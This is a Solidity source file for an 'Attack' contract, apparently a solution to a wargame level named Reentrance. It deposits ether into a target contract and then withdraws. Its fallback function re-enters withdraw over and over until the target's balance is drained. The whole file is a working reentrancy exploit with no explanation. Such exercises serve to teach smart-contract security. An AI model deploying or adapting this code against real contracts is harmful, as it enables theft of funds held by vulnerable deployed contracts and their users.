// SPDX-License-Identifier: MIT
pragma solidity ^0.6.0;

import "./Reentrance.sol";

contract Attack {
    Reentrance VulnerableContract;

    constructor(address payable _vulnerable) public payable {
        VulnerableContract = Reentrance(_vulnerable);
    }


    function sendInitialDonation() public payable {
        VulnerableContract.donate{value: msg.value}(address(this));
        VulnerableContract.withdraw(0.1 ether);
    }

    fallback() external payable {
        if (address(VulnerableContract).balance != 0) {
            VulnerableContract.withdraw(1000000000000000); // 0.001 ether in wei 
        }
    }

    function checkBalance() public view returns(uint) {
        return address(this).balance;
    }
}
